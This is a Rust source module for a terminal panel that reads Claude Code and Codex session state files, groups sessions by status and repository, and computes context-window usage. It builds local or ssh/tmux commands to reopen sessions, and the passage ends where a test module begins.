//! Reads Claude Code's job state from `~/.claude/jobs/<short>/state.json`.
//!
//! This is the only module that knows Claude Code's on-disk format. Everything
//! above it sees `Job` and `Snapshot`. Parsing is deliberately lenient: every
//! field is optional, and a job we cannot understand is skipped rather than
//! fatal, so a Claude Code upgrade degrades the panel instead of breaking it.

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::process::Command;

use anyhow::{Context, Result};
use chrono::{DateTime, Utc};
use serde::Deserialize;

use crate::sh;

/// Which of the three panel groups a job belongs to.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Status {
    NeedsInput,
    Working,
    Done,
}

impl Status {
    pub fn heading(self) -> &'static str {
        match self {
            Status::NeedsInput => "Needs input",
            Status::Working => "Working",
            Status::Done => "Completed",
        }
    }
}

/// A linked artifact Claude Code found in the transcript (today: pull requests).
#[derive(Debug, Clone)]
pub struct Link {
    pub id: String,
    pub kind: String,
    /// Kept for M1 (opening the PR); unused by the read-only panel.
    #[allow(dead_code)]
    pub href: String,
}

/// Which agent this session is.
///
/// Savras reads two programs' files now, and the difference reaches exactly
/// two places: how a session is opened, and the word for a turn that has
/// finished while the session is still there. Everything else — the row, the
/// grouping, the board, the age — is the same question asked of the same
/// fields, which is the point of having one `Job`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum Client {
    #[default]
    Claude,
    Codex,
}

#[derive(Debug, Clone)]
pub struct Job {
    /// Short id, and the directory name under `jobs/`.
    pub short: String,
    pub name: String,
    pub color: Option<String>,
    pub status: Status,
    /// The one line the panel shows: the pending question, the result, or the
    /// current activity, depending on status.
    pub summary: String,
    pub cwd: PathBuf,
    pub session_id: String,
    pub tokens: u64,
    pub updated_at: Option<DateTime<Utc>>,
    pub links: Vec<Link>,
    /// Claude Code runs most sessions in its daemon. Those are *attached*, not
    /// resumed — resuming one that is running is refused.
    pub backend: Option<String>,
    /// The short id the daemon knows the session by, which is what `claude
    /// attach` takes.
    pub daemon_short: Option<String>,
    /// The machine it is running on, when that is not this one.
    pub machine: Option<Remote>,
    /// When the session was started — not when it last said something.
    ///
    /// The panel's age column is measured from here. Freshness was the first
    /// cut and it says almost nothing: a working session rewrites `updatedAt`
    /// every few seconds, so it reads `8s` for as long as it runs, however
    /// long that is. How long a session has been *open* is the number that
    /// changes what you do — a session in its sixth hour has usually lost the
    /// plot, and the panel is the only thing in a position to say so.
    pub created_at: Option<DateTime<Utc>>,
    /// The model it was started with, or the configured default when its own
    /// flags do not say. Only the context window is taken from it, which is
    /// why it is kept as written.
    pub model: Option<String>,
    /// What the session is actually holding, from the last message in its
    /// transcript. `None` when there is no transcript to read, and then
    /// `tokens` from the state file is all there is — see [`context_used`] for
    /// why that is a poor second.
    pub context: Option<u64>,
    /// The context window this session was given, when it says so itself.
    ///
    /// Claude Code does not, so the window is read out of the model name
    /// there. Codex writes it on every turn, and a number the session
    /// reported beats a number we inferred — it is also the only way to be
    /// right about a model this panel has never heard of.
    pub context_window: Option<u64>,
    /// Finished badly. Claude Code has no such state today; this is here so
    /// that one it grows is shown rather than read as `done`.
    pub failed: bool,
    /// What the pull request this session produced is doing, when it has one
    /// and the cache knows about it.
    pub deploy: Option<Deploy>,
    /// Which agent this is: Claude Code, or Codex.
    pub client: Client,
}

/// What a session's pull request is doing.
///
/// Read from `~/.claude/gh-pr-status-cache.json`, which Claude Code writes and
/// refreshes itself — so this costs one small file read per scan and no
/// network at all. Anything richer than this (a real deployment, from Vercel
/// or Actions) needs a poller of our own, and waits for one.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Deploy {
    /// Open, with nothing known about its checks.
    Open,
    /// Open, checks green.
    Ready,
    /// Open, checks still running.
    Checks,
    /// Open, a check has failed — the one state you want to see from here.
    Broken,
    Merged,
    Closed,
}

impl Deploy {
    /// The word the row shows, next to the number.
    pub fn word(self) -> &'static str {
        match self {
            Deploy::Open => "PR",
            Deploy::Ready => "READY",
            Deploy::Checks => "CHECKS",
            Deploy::Broken => "FAILED",
            Deploy::Merged => "MERGED",
            Deploy::Closed => "CLOSED",
        }
    }
}

/// A session on another machine, and how to get to it.
///
/// A box you ssh into and work in by hand has no daemon to attach to, so
/// "open this session" means "put me in the tmux window it is running in".
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Remote {
    /// The ssh target — a host alias from your ssh config, usually.
    pub host: String,
    /// Where tmux has it: `session:@window.%pane`, in tmux's own ids.
    pub tmux: Option<String>,
    /// Its process id *on that machine*. The far side names its session file
    /// after it, and it is the only handle anything over there answers to:
    /// there is no daemon on a box you ssh into, so a session is stopped by
    /// signalling the process, not by asking a service to.
    pub pid: Option<u32>,
}

impl Remote {
    /// How to put this session in front of you.
    ///
    /// Not a plain `tmux attach`. The user is already attached to that session
    /// from their own terminal, and a second client forces both to the smaller
    /// of the two sizes — the panel would silently shrink the window they are
    /// working in. A *grouped* session shares the windows but keeps its own
    /// size and its own idea of which window is selected, and
    /// `destroy-unattached` takes it away again the moment the tab closes, so
    /// nothing is left behind on the machine.
    ///
    /// With no tmux to go to, this is a plain login shell on the box, which is
    /// still the useful thing to be given.
    pub fn open_command(&self) -> Vec<String> {
        let mut ssh = vec!["ssh".to_string(), "-t".to_string()];
        // The watcher holds a multiplexed connection open; reusing it means
        // opening a session costs no handshake, and one of sshd's ten
        // channels rather than a new one.
        ssh.push("-o".into());
        ssh.push("ControlMaster=auto".into());
        ssh.push("-o".into());
        ssh.push("ControlPath=~/.ssh/savras-%r@%h:%p".into());
        ssh.push("-o".into());
        ssh.push("ControlPersist=10m".into());
        // See `remote::watch`: a host name is not allowed to be an option.
        ssh.push("--".into());
        ssh.push(self.host.clone());
        ssh.push(match self.tmux.as_deref().and_then(split_target) {
            // `\;` and not `;`: the remote shell has to hand tmux a literal
            // semicolon as an argument rather than end the command there.
            // Grouped and attached in one: the group gives the pane its own
            // size and its own selected window, and `destroy-unattached`
            // takes the group away when you leave.
            // Quoted through `sh`, not by hand: the far side evaluates this
            // string, and both halves of the target are names chosen on that
            // machine rather than here.
            Some((session, window)) => [
                format!("tmux new-session -t {}", sh::quote(session)),
                "set destroy-unattached on".to_string(),
                "set -w aggressive-resize on".to_string(),
                format!("select-window -t {}", sh::quote(window)),
            ]
            .join(" \\; "),
            None => "exec ${SHELL:-sh} -l".to_string(),
        });
        ssh
    }
}

/// `session:@window.%pane` split into the session to group with and the window
/// to select. Anything that is not that shape names nothing we can steer to.
fn split_target(tmux: &str) -> Option<(&str, &str)> {
    let (session, rest) = tmux.split_once(':')?;
    let window = rest.split('.').next().filter(|w| !w.is_empty())?;
    (!session.is_empty()).then_some((session, window))
}

impl Job {
    /// How to open this session in a terminal.
    ///
    /// A session running in Claude Code's daemon must be attached: asking to
    /// resume it is refused with "is running as a background session ... run
    /// `claude attach` to open it". Attaching is also the gentler of the two —
    /// the session keeps running whether you attach to it or not.
    pub fn open_command(&self) -> Vec<String> {
        // A session on another machine is reached by ssh, whatever this one
        // would have done with it.
        if let Some(remote) = &self.machine {
            return remote.open_command();
        }
        // Codex has one way in, and it takes the session's own id.
        if self.client == Client::Codex {
            return vec![
                "codex".to_string(),
                "resume".to_string(),
                self.session_id.clone(),
            ];
        }
        match (&self.backend, &self.daemon_short) {
            (Some(backend), Some(short)) if backend == "daemon" => {
                vec!["claude".into(), "attach".into(), short.clone()]
            }
            _ => vec!["claude".into(), "--resume".into(), self.session_id.clone()],
        }
    }

    /// The same command, as one line for the panel to show.
    pub fn open_command_line(&self) -> String {
        // The real command for a session on another machine is four ssh
        // options and a tmux script, and a 46-column footer would show the
        // options and none of the point. Said short, it is still the two
        // things you would want to know: which box, and which window.
        if let Some(remote) = &self.machine {
            return match &remote.tmux {
                Some(target) => format!("ssh {} · tmux {target}", remote.host),
                None => format!("ssh {}", remote.host),
            };
        }
        self.open_command().join(" ")
    }

    /// The one word the row leads with: what this session *is*, right now.
    ///
    /// It takes the place of the summary in a narrow panel. The summary says
    /// what a session is doing, which is a sentence and needs the width of
    /// one; this answers the question you actually scan a list of ten
    /// sessions for — which of these wants me, which are still going, which
    /// are finished — and answers it in seven columns.
    pub fn word(&self) -> &'static str {
        match (self.failed, self.status, self.client) {
            (true, ..) => "FAILED",
            (_, Status::NeedsInput, _) => "WAITING",
            (_, Status::Working, _) => "WORKING",
            // A Codex thread loaded in Codex's daemon has a window you can
            // type into, so a turn that ended there is `IDLE` — `DONE` would
            // be a lie. One nobody has open is done until it is resumed.
            (_, Status::Done, Client::Codex) if self.backend.is_some() => "IDLE",
            (_, Status::Done, _) => "DONE",
        }
    }

    /// How much of the context window is spent, as a percentage.
    ///
    /// `None` only when nobody counted — a session on another machine reports
    /// no tokens at all, and there is a real difference between "nothing was
    /// counted" and "nothing has been spent". A session of your own that has
    /// only just started says `0%`, which is true and is what a blank was
    /// mistaken for.
    pub fn context_percent(&self) -> Option<u8> {
        if self.machine.is_some() {
            return None;
        }
        let window = self
            .context_window
            .unwrap_or_else(|| context_window(self.model.as_deref()));
        // Codex sets its first 12,000 tokens aside — its instructions and
        // tools, which no conversation can free — and counts the rest against
        // the rest of the window. Its own footer does, so the row does too:
        // 20,744 of 258,400 is 4% there, and would be 8% here otherwise.
        let (held, window) = match self.client {
            Client::Codex => (
                self.context().saturating_sub(CODEX_BASELINE),
                window.saturating_sub(CODEX_BASELINE).max(1),
            ),
            Client::Claude => (self.context(), window),
        };
        // Rounded, not truncated, so the row agrees with the status line the
        // session draws for itself: 386,839 of a million is 39% in both
        // places, and two numbers for one thing is worse than either.
        let percent = (held.saturating_mul(100) + window / 2) / window;
        Some(percent.min(100) as u8)
    }

    /// The tokens this session is holding, which is what the percentage and
    /// the detail footer both mean.
    pub fn context(&self) -> u64 {
        self.context.unwrap_or(self.tokens)
    }

    /// Which machine this session is on, when it is not this one.
    ///
    /// The one place that answer is spelled. Three things ask it — the
    /// repository heading, the row, and the footer deciding whether a key
    /// would do anything — and a fourth spelling of it is how they drift.
    pub fn machine_tag(&self) -> Option<&str> {
        self.machine.as_ref().map(|remote| remote.host.as_str())
    }

    /// Whether this session is in a worktree rather than the repository's own
    /// checkout — worth saying, because the same repository name then covers
    /// two different working copies.
    pub fn in_worktree(&self) -> bool {
        // Only ever asked of a path on *this* machine. See `repo`.
        self.machine.is_none() && git_dir(&self.cwd).is_some_and(|d| d.contains("/.git/worktrees/"))
    }

    /// Which repository this session is working in, by name.
    ///
    /// The nearest ancestor of `cwd` holding a `.git`, named after its own
    /// directory. Worktrees are followed home: a `.git` *file* says
    /// `gitdir: /path/to/repo/.git/worktrees/<name>`, and the repository is
    /// the path before that `.git` — otherwise every worktree would sort as a
    /// repository of its own, which is exactly wrong for the parallel agents
    /// that live in them.
    ///
    /// A `cwd` with no git anywhere above it is its own directory's name;
    /// there is nothing better to call it, and a session running outside a
    /// repository is still somewhere.
    pub fn repo(&self) -> String {
        match &self.machine {
            // Named for the machine as well: the same checkout exists on both,
            // and one heading over two boxes says the work is in one place.
            //
            // The name is taken from the path itself, and the local filesystem
            // is never asked about it — `/home/ubuntu/x` is a directory on the
            // *other* machine, so walking up it for a `.git` can only fail.
            // Failing is not free: `/home` on macOS is an autofs mount
            // resolved through directory services, so each probe of a path
            // under it wakes `automountd` and `opendirectoryd` and costs about
            // **10ms**, against 2µs for a local path that merely does not
            // exist. One walk is six of those. It ran on every frame through
            // `in_worktree`, and once per job per repository on every refresh
            // — which is why one session on a remote box made the whole
            // terminal, not just Savras, feel slow.
            Some(_) => format!(
                "{}:{}",
                self.machine_tag().unwrap_or_default(),
                named(&self.cwd)
            ),
            None => repo_of(&self.cwd),
        }
    }

    /// `cwd` with the home directory folded back to `~`.
    pub fn short_cwd(&self) -> String {
        let path = self.cwd.to_string_lossy().to_string();
        match directories::BaseDirs::new() {
            Some(dirs) => {
                let home = dirs.home_dir().to_string_lossy().to_string();
                match path.strip_prefix(&home) {
                    Some("") => "~".to_string(),
                    Some(rest) => format!("~{rest}"),
                    None => path,
                }
            }
            None => path,
        }
    }
}

/// The name of the repository a directory belongs to.
///
/// Walking up for a `.git` is what git itself does, and it is the only way to
/// get the same answer from a session started three directories inside a
/// checkout as from one started at its root.
/// What Claude Code last knew about the pull requests it has seen.
///
/// Keyed by the same `href` the job's `children[]` carries, so the join needs
/// nothing invented at either end. A missing or unreadable file is an empty
/// map: the deploy column simply says less, which is what it should do when
/// nothing has been looked up yet.
fn pr_cache(jobs_dir: &Path) -> std::collections::HashMap<String, RawPr> {
    let Some(claude) = jobs_dir.parent() else {
        return Default::default();
    };
    let text = match std::fs::read_to_string(claude.join("gh-pr-status-cache.json")) {
        Ok(text) => text,
        Err(_) => return Default::default(),
    };
    serde_json::from_str(&text).unwrap_or_default()
}

/// One pull request as the cache has it.
#[derive(Debug, Clone, Default, Deserialize)]
struct RawPr {
    state: Option<String>,
    checks: Option<RawChecks>,
}

#[derive(Debug, Clone, Copy, Default, Deserialize)]
struct RawChecks {
    passed: u32,
    failed: u32,
    pending: u32,
}

/// The one word for a pull request in that state.
///
/// A failing check outranks everything else that is true of an open pull
/// request, because it is the only one of these that is asking for something.
fn deploy_of(pr: &RawPr) -> Deploy {
    match pr.state.as_deref() {
        Some("MERGED") => Deploy::Merged,
        Some("CLOSED") => Deploy::Closed,
        // OPEN, DRAFT, or a state this version has never heard of: what the
        // checks say is more use than the word itself.
        _ => match pr.checks {
            Some(c) if c.failed > 0 => Deploy::Broken,
            Some(c) if c.pending > 0 => Deploy::Checks,
            Some(c) if c.passed > 0 => Deploy::Ready,
            _ => Deploy::Open,
        },
    }
}

/// How many tokens the model this session runs on can hold.
///
/// Claude Code writes the model into `respawnFlags` as it was asked for, and
/// the long-context variants say so in the name: `claude-opus-5[1m]` is a
/// million. Everything else is 200k, which is the family's ordinary window —
/// and an unknown model guessing 200k is the safe way round, since it makes a
/// busy session look busier rather than emptier than it is.
/// The tokens Codex sets aside before it counts a conversation against its
/// window — `BASELINE_TOKENS` in its own source. See `Job::context_percent`.
const CODEX_BASELINE: u64 = 12_000;

fn context_window(model: Option<&str>) -> u64 {
    match model {
        Some(name) if name.contains("[1m]") => 1_000_000,
        _ => 200_000,
    }
}

/// The model out of `respawnFlags`: the argument after `--model`.
fn model_of(flags: &[String]) -> Option<String> {
    let at = flags.iter().position(|f| f == "--model")?;
    flags.get(at + 1).cloned()
}

/// The model a session runs on when its own flags do not say.
///
/// `respawnFlags` carries `--model` only when the session was *started* with
/// one; without it Claude Code uses the configured default, so that is where
/// the answer is. Getting this wrong is not a rounding error — a 1M session
/// measured against 200k reads 39% when it is really 18%, which is the
/// difference between "carry on" and "wrap this up".
fn default_model(claude_dir: &Path) -> Option<String> {
    let text = std::fs::read_to_string(claude_dir.join("settings.json")).ok()?;
    let raw: serde_json::Value = serde_json::from_str(&text).ok()?;
    raw.get("model")?.as_str().map(str::to_string)
}

/// How much context a session is actually holding, read from its transcript.
///
/// **Not `tokens` from `state.json`.** That field counts something else: one
/// session here reported 154k while it was really holding 387k, and another
/// 78k while holding 185k — wrong in both directions, so no correction factor
/// would have saved it. The number Claude Code shows in its own status line is
/// the last assistant message's `usage`, and that is what this reads: input,
/// output, and both halves of the cache, which together are the whole of what
/// the model was sent.
///
/// The file is a transcript of everything and runs to megabytes, so it is read
/// from the *end* — one bounded seek, not a walk. Sub-agent turns are skipped:
/// a subagent has a context of its own, and the row is about the session.
fn context_used(transcript: &Path) -> Option<u64> {
    use std::io::{Read, Seek, SeekFrom};

    let mut file = std::fs::File::open(transcript).ok()?;
    let size = file.metadata().ok()?.len();
    // Enough for the last exchange in the transcripts seen so far. It stays
    // bounded because this is read on every scan: a transcript whose last
    // usage is further back than this simply falls back to the state file.
    const TAIL: u64 = 256 * 1024;
    file.seek(SeekFrom::Start(size.saturating_sub(TAIL))).ok()?;
    let mut buf = Vec::new();
    file.read_to_end(&mut buf).ok()?;
    let text = String::from_utf8_lossy(&buf);

    // Backwards: the last message is the one holding the most.
    for line in text.lines().rev() {
        // The first line of the window is usually a fragment, and a transcript
        // being written to can end in one too.
        let Ok(entry) = serde_json::from_str::<RawEntry>(line) else {
            continue;
        };
        if entry.is_sidechain.unwrap_or(false) {
            continue;
        }
        if let Some(usage) = entry.message.and_then(|m| m.usage) {
            return Some(usage.held());
        }
    }
    None
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct RawEntry {
    message: Option<RawMessage>,
    /// A subagent's turn, which has a context of its own.
    is_sidechain: Option<bool>,
}

#[derive(Debug, Deserialize)]
struct RawMessage {
    usage: Option<RawUsage>,
}

/// What the model was sent, which is what "context used" means. Cached input
/// counts: it is in the window whether it was re-sent or not.
#[derive(Debug, Default, Deserialize)]
struct RawUsage {
    #[serde(default)]
    input_tokens: u64,
    #[serde(default)]
    output_tokens: u64,
    #[serde(default)]
    cache_creation_input_tokens: u64,
    #[serde(default)]
    cache_read_input_tokens: u64,
}

impl RawUsage {
    fn held(&self) -> u64 {
        self.input_tokens
            + self.output_tokens
            + self.cache_creation_input_tokens
            + self.cache_read_input_tokens
    }
}

/// The last component of a path, as a name — what a directory is called, with
/// nothing asked of any filesystem.
fn named(cwd: &Path) -> String {
    cwd.file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_else(|| cwd.to_string_lossy().to_string())
}

/// The repository a directory on this machine is in, by name — what
/// [`Job::repo`] calls a local session's repository, so a pane of your own
/// standing in the same place lands under the same heading.
pub fn repo_of(cwd: &Path) -> String {
    // Nowhere at all: a session whose file names no directory, or a Codex
    // session that has not had its first turn and has not said where it is
    // yet. Asked first, because an empty path is not a path that fails to be
    // a repository — it is the *current* directory, which is wherever the
    // panel happens to have been started, and answering with that would put a
    // session in a repository it has never been near.
    if cwd.as_os_str().is_empty() {
        return "no directory".to_string();
    }
    let root = match git_dir(cwd).as_deref().and_then(repo_root) {
        Some(root) => PathBuf::from(root),
        // Not in a repository at all: the directory is all there is to go on,
        // and home is worth spelling the way the rest of the panel spells it.
        None => match directories::BaseDirs::new() {
            Some(dirs) if dirs.home_dir() == cwd => return "~".to_string(),
            _ => cwd.to_path_buf(),
        },
    };
    root.file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_else(|| root.to_string_lossy().to_string())
}

/// The repository a git directory belongs to.
///
/// `<repo>/.git` in a checkout, and `<repo>/.git/worktrees/<name>` in a
/// worktree — which is why worktrees come home rather than sorting as
/// repositories of their own, and that matters here: parallel agents live in
/// them, and three agents on one repository are three rows under one heading.
fn repo_root(git_dir: &str) -> Option<&str> {
    if let Some(root) = git_dir.strip_suffix("/.git") {
        return Some(root).filter(|r| !r.is_empty());
    }
    let cut = git_dir.find("/.git/worktrees/")?;
    Some(&git_dir[..cut]).filter(|r| !r.is_empty())
}

/// Where this directory's git data lives, as a path, if it is in a repository
/// at all. `.git` is a directory in a checkout and a file in a worktree — the
/// file holds `gitdir: <path>`, which is how a worktree names its parent.
fn git_dir(cwd: &Path) -> Option<String> {
    for dir in cwd.ancestors() {
        let dot = dir.join(".git");
        if dot.is_dir() {
            return Some(dot.to_string_lossy().to_string());
        }
        if dot.is_file() {
            let said = std::fs::read_to_string(&dot).ok()?;
            let path = said.trim().strip_prefix("gitdir:")?.trim().to_string();
            return Some(path);
        }
    }
    None
}

/// Everything the panel renders, in display order.
#[derive(Debug, Clone, Default)]
pub struct Snapshot {
    pub jobs: Vec<Job>,
}

impl Snapshot {
    pub fn count(&self, status: Status) -> usize {
        self.jobs.iter().filter(|j| j.status == status).count()
    }

    pub fn is_empty(&self) -> bool {
        self.jobs.is_empty()
    }
}

// --- on-disk shape -------------------------------------------------------
// Mirrors state.json as written by Claude Code 2.1.x. Every field optional.

#[derive(Debug, Deserialize)]
struct RawOutput {
    result: Option<String>,
}

#[derive(Debug, Deserialize)]
struct RawChild {
    id: Option<String>,
    kind: Option<String>,
    href: Option<String>,
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct RawState {
    state: Option<String>,
    name: Option<String>,
    color: Option<String>,
    detail: Option<String>,
    needs: Option<String>,
    output: Option<RawOutput>,
    children: Option<Vec<RawChild>>,
    cwd: Option<String>,
    session_id: Option<String>,
    tokens: Option<u64>,
    updated_at: Option<String>,
    created_at: Option<String>,
    respawn_flags: Option<Vec<String>>,
    /// Where Claude Code is reading this session's transcript from, which is
    /// also where the only honest token count lives.
    link_scan_path: Option<String>,
    backend: Option<String>,
    daemon_short: Option<String>,
}

/// Default location of Claude Code's job directory.
pub fn default_jobs_dir() -> Result<PathBuf> {
    let dirs = directories::BaseDirs::new().context("could not determine home directory")?;
    Ok(dirs.home_dir().join(".claude").join("jobs"))
}

/// Read every readable job. Missing directory yields an empty snapshot rather
/// than an error: "Claude Code has never run here" is a state to display, not
/// a crash.
pub fn load(jobs_dir: &Path) -> Result<Snapshot> {
    let entries = match std::fs::read_dir(jobs_dir) {
        Ok(entries) => entries,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(Snapshot::default()),
        Err(e) => return Err(e).with_context(|| format!("reading {}", jobs_dir.display())),
    };

    // Read once for the whole scan rather than once per job: it is one small
    // file, and every job asks it the same question.
    let prs = pr_cache(jobs_dir);
    // Read once for the whole scan, like the cache above: every session that
    // was started without `--model` asks the same question of the same file.
    let fallback_model = jobs_dir.parent().and_then(default_model);

    let mut jobs = Vec::new();
    for entry in entries.flatten() {
        if !entry.file_type().map(|t| t.is_dir()).unwrap_or(false) {
            continue; // pins.json and friends
        }
        let short = entry.file_name().to_string_lossy().to_string();
        if let Some(mut job) = read_one(&entry.path(), &short, fallback_model.as_deref()) {
            job.deploy = job
                .links
                .first()
                .and_then(|link| prs.get(&link.href))
                .map(deploy_of);
            jobs.push(job);
        }
    }

    // Group first — the rows most likely to need you are nearest the top —
    // then by name, which does not move.
    //
    // Freshest-first was the original second key and it had to go. A working
    // session rewrites its timestamp every few seconds, so rows swapped places
    // while you were looking at them: pressing the switch key twice landed
    // somewhere different each time, and the panel could not be navigated by
    // muscle memory at all. A name is the one thing about a session that
    // stands still, so the list only moves when a session changes *status* —
    // which is a change worth seeing.
    sort(&mut jobs);

    Ok(Snapshot { jobs })
}

/// The job id of the Claude Code session running as this process, if one is.
///
/// Claude Code writes `~/.claude/sessions/<pid>.json` for every live session,
/// on every machine, and it carries `jobId` — the directory name under
/// `jobs/`. So a pid is enough to say "that pane is not a shell, it is
/// LINUX-B", which is the difference between a tab called `shell 2` sitting
/// next to a row for the same session and one row that says where it is.
pub fn job_running_as(pid: i32, jobs_dir: &Path) -> Option<String> {
    // Beside the jobs directory, because that is where Claude Code keeps it —
    // and because pointing Savras at another jobs directory should point this
    // at the sessions that belong to it rather than at your real ones.
    let path = jobs_dir
        .parent()?
        .join("sessions")
        .join(format!("{pid}.json"));
    let text = std::fs::read_to_string(path).ok()?;
    let raw: RawSessionFile = serde_json::from_str(&text).ok()?;
    raw.job_id.filter(|id| !id.is_empty())
}

/// Which job is running in each process group, for every live session on this
/// machine.
///
/// A pane knows one number about what is in it: the process group its terminal
/// has in the foreground. Asking `sessions/<that pid>.json` looked obvious and
/// is wrong for the case it matters most in — a `claude` you start in a tab is
/// a launcher that forks the session as a *child in the same group*, and it is
/// the child that writes the file. The leader has no file and never will, so
/// the lookup could only ever miss, and the pane stayed a row called `claude`
/// beside the row for the very session inside it.
///
/// So the join is the group rather than the leader, which is true of both
/// shapes: a session that is its own group leader is in the map under its own
/// pid. It costs one `ps` for the handful of pids that have a file at all —
/// asked once per pass, not once per pane, and not at all once every pane
/// knows what it is.
pub fn jobs_by_group(jobs_dir: &Path) -> HashMap<i32, String> {
    let mut found = HashMap::new();
    let Some(dir) = jobs_dir.parent().map(|d| d.join("sessions")) else {
        return found;
    };
    let Ok(entries) = std::fs::read_dir(&dir) else {
        return found;
    };
    // Only the sessions that name a job: an interactive `claude` writes one of
    // these too, and it is not a row on the panel to be joined to.
    let jobs: Vec<(i32, String)> = entries
        .flatten()
        .filter_map(|entry| {
            let name = entry.file_name();
            let pid: i32 = name.to_str()?.strip_suffix(".json")?.parse().ok()?;
            Some((pid, job_running_as(pid, jobs_dir)?))
        })
        .collect();
    if jobs.is_empty() {
        return found;
    }

    let pids = jobs
        .iter()
        .map(|(pid, _)| pid.to_string())
        .collect::<Vec<_>>()
        .join(",");
    // One `ps` for all of them rather than one each: the fork is the whole
    // cost here, and the same flags mean the same thing on both machines this
    // runs on. A pid that has since exited is simply not in the answer.
    let Ok(out) = Command::new("ps")
        .args(["-o", "pid=,pgid=", "-p", &pids])
        .output()
    else {
        return found;
    };
    let groups: HashMap<i32, i32> = String::from_utf8_lossy(&out.stdout)
        .lines()
        .filter_map(|line| {
            let mut said = line.split_whitespace();
            Some((said.next()?.parse().ok()?, said.next()?.parse().ok()?))
        })
        .collect();

    for (pid, job) in jobs {
        if let Some(group) = groups.get(&pid) {
            found.insert(*group, job);
        }
    }
    found
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct RawSessionFile {
    job_id: Option<String>,
}

/// The panel's order, applied wherever jobs are put together: local ones as
/// they are read, and again once the machines' rows are mixed in.
///
/// **Oldest first, by when the session was started.** Status was the first
/// cut, and a status changes while you are looking at it: a session answering
/// a question moved from the top of the list to the bottom of it, taking its
/// repository with it, and the row you were about to press enter on was
/// somewhere else. Start time never changes, so a session keeps its place for
/// as long as it lives and the list only grows at the end.
pub fn sort(jobs: &mut [Job]) {
    // A session whose start time we could not read sorts after the dated ones
    // rather than jumping to the top: `None` is missing, not old. The id
    // breaks ties last, because two machines can hold sessions with the same
    // derived name and a list that reordered itself between batches would be
    // the "slot machine" all over again.
    jobs.sort_by(|a, b| {
        started(a)
            .cmp(&started(b))
            .then(a.name.cmp(&b.name))
            .then(a.short.cmp(&b.short))
    });
}

/// When a session started, for ordering: undated ones sort last.
pub fn started(job: &Job) -> (bool, Option<DateTime<Utc>>) {
    (job.created_at.is_none(), job.created_at)
}

/// The file, parsed — with one retry.
///
/// Claude Code rewrites `state.json` in place, so a read timed badly enough
/// returns half a document, which parses as nothing. Once that is the whole
/// difference between a job that is on the panel and a job that is not, and
/// the rewrite is over in microseconds; a second look a moment later steps
/// over it. A job that is genuinely unreadable still costs only one extra
/// read per refresh.
fn read_state(path: &Path) -> Option<RawState> {
    if let Some(raw) = parse(path) {
        return Some(raw);
    }
    std::thread::sleep(std::time::Duration::from_millis(2));
    parse(path)
}

fn parse(path: &Path) -> Option<RawState> {
    let text = std::fs::read_to_string(path).ok()?;
    serde_json::from_str(&text).ok()
}

fn read_one(dir: &Path, short: &str, fallback_model: Option<&str>) -> Option<Job> {
    let raw = read_state(&dir.join("state.json"))?;

    let done = raw.state.as_deref() == Some("done");
    let needs = raw
        .needs
        .as_deref()
        .map(str::trim)
        .filter(|s| !s.is_empty());

    // A job that is both finished and asking a question is finished: the
    // question can no longer be answered.
    let status = if done {
        Status::Done
    } else if needs.is_some() {
        Status::NeedsInput
    } else {
        Status::Working
    };

    let result = raw
        .output
        .as_ref()
        .and_then(|o| o.result.as_deref())
        .map(str::trim)
        .filter(|s| !s.is_empty());
    let detail = raw
        .detail
        .as_deref()
        .map(str::trim)
        .filter(|s| !s.is_empty());

    let summary = match status {
        Status::NeedsInput => needs.or(detail).unwrap_or("waiting for you"),
        Status::Done => result.or(detail).unwrap_or("finished"),
        Status::Working => detail.unwrap_or("working"),
    };

    let links = raw
        .children
        .unwrap_or_default()
        .into_iter()
        .filter_map(|c| {
            Some(Link {
                id: c.id?,
                kind: c.kind.unwrap_or_else(|| "link".into()),
                href: c.href.unwrap_or_default(),
            })
        })
        .collect();

    Some(Job {
        short: short.to_string(),
        name: raw.name.unwrap_or_else(|| short.to_string()),
        color: raw.color,
        status,
        summary: collapse_whitespace(summary),
        cwd: raw.cwd.map(PathBuf::from).unwrap_or_default(),
        session_id: raw.session_id.unwrap_or_else(|| short.to_string()),
        tokens: raw.tokens.unwrap_or(0),
        updated_at: raw
            .updated_at
            .and_then(|s| DateTime::parse_from_rfc3339(&s).ok())
            .map(|d| d.with_timezone(&Utc)),
        links,
        machine: None,
        backend: raw.backend,
        daemon_short: raw.daemon_short,
        created_at: raw
            .created_at
            .and_then(|s| DateTime::parse_from_rfc3339(&s).ok())
            .map(|d| d.with_timezone(&Utc)),
        // Its own flag first, then whatever this machine is configured to
        // use: a session started without `--model` runs on the default, and
        // measuring it against 200k when the default is a million is how a
        // session at 18% came to read 39%.
        model: raw
            .respawn_flags
            .as_deref()
            .and_then(model_of)
            .or_else(|| fallback_model.map(str::to_string)),
        context: raw
            .link_scan_path
            .as_deref()
            .map(Path::new)
            .and_then(context_used),
        failed: matches!(raw.state.as_deref(), Some("failed") | Some("error")),
        // Filled in by `load`, which holds the cache the answer comes from.
        context_window: None,
        deploy: None,
        client: Client::Claude,
    })
}

/// Summaries come from transcripts and may contain newlines; the panel gives
/// each job one line.
fn collapse_whitespace(s: &str) -> String {
    s.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// Compact age, as the panel shows it: `47s`, `29m`, `3h`, `1d`.
pub fn age(updated: Option<DateTime<Utc>>, now: DateTime<Utc>) -> String {
    let Some(updated) = updated else {
        return "-".to_string();
    };
    let secs = (now - updated).num_seconds().max(0);
    match secs {
        s if s < 60 => format!("{s}s"),
        s if s < 3600 => format!("{}m", s / 60),
        s if s < 86_400 => format!("{}h", s / 3600),
        s => format!("{}d", s / 86_400),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    use crate::testing::Fixture;

    #[test]
    fn a_worktree_belongs_to_the_repository_it_was_cut_from() {
        // Parallel agents live in worktrees. Sorting each one as a repository
        // of its own would scatter three agents on one codebase across three
        // headings named after their branches.
